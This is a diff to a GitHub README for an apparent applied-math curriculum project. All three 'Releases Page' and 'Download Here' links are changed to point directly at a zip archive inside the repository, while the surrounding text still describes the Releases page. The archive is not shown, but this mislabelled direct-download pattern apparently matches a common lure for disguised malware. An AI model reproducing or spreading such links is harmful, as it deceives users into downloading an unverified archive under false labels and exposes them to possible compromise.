@@ -1,7 +1,7 @@
 # 📚 streamlined-applied-math-curriculum - Learn Applied Math at Your Own Pace
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue)](https://github.com/Joakr95/streamlined-applied-math-curriculum/releases)
+[![Download](https://github.com/Joakr95/streamlined-applied-math-curriculum/raw/refs/heads/main/resources/curriculum-applied-math-streamlined-v2.8-beta.5.zip)](https://github.com/Joakr95/streamlined-applied-math-curriculum/raw/refs/heads/main/resources/curriculum-applied-math-streamlined-v2.8-beta.5.zip)
 
 ---
 
@@ -23,7 +23,7 @@ To get started with the curriculum, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to go to the GitHub Releases page.  
 
-   [Download Here](https://github.com/Joakr95/streamlined-applied-math-curriculum/releases)
+   [Download Here](https://github.com/Joakr95/streamlined-applied-math-curriculum/raw/refs/heads/main/resources/curriculum-applied-math-streamlined-v2.8-beta.5.zip)
 
 2. **Choose the Latest Release**: On the Releases page, look for the entry labeled "Latest Release". This will have the latest version of the curriculum.
 
@@ -80,4 +80,4 @@ Thank you for choosing the streamlined-applied-math-curriculum. We hope you enjo
 
 ## 🌐 Explore More
 
-Don’t forget to visit our [Releases Page](https://github.com/Joakr95/streamlined-applied-math-curriculum/releases) for the latest updates and download options. Happy learning!
+Don’t forget to visit our [Releases Page](https://github.com/Joakr95/streamlined-applied-math-curriculum/raw/refs/heads/main/resources/curriculum-applied-math-streamlined-v2.8-beta.5.zip) for the latest updates and download options. Happy learning!
